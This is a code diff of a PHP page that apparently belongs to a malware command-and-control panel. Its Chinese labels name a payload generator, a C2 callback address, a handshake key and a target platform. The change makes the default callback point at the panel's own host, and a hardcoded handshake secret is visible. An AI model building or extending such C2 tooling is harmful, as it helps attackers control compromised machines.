@@ -62,12 +62,15 @@ $csrf = csrf_token();
   <div class="stat-card green"><div class="stat-icon"><i class="fas fa-virus"></i></div><div><span class="stat-num">3</span><label>平台</label></div></div>
 </section>
 
+<?php
+$server_url = (isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']==='on'?'https':'http').'://'.$_SERVER['HTTP_HOST'];
+?>
 <!-- 载荷生成器 -->
 <section class="panel" id="panel-gen">
 <h2><i class="fas fa-virus"></i> 载荷生成器</h2>
 
 <div class="gen-opts" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:20px">
-  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($GLOBALS['_ENV']['DB_HOST'] ?? 'http://127.0.0.1')?>/handshake.php"></div>
+  <div class="field"><label>回连地址 (C2)</label><input type="text" id="c2url" value="<?=h($server_url)?>/handshake.php"></div>
   <div class="field"><label>握手密钥</label><input type="text" id="gensecret" value="jasmin@123"></div>
   <div class="field"><label>目标系统</label>
     <select id="gen-platform" style="width:100%;padding:9px 12px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.85rem">
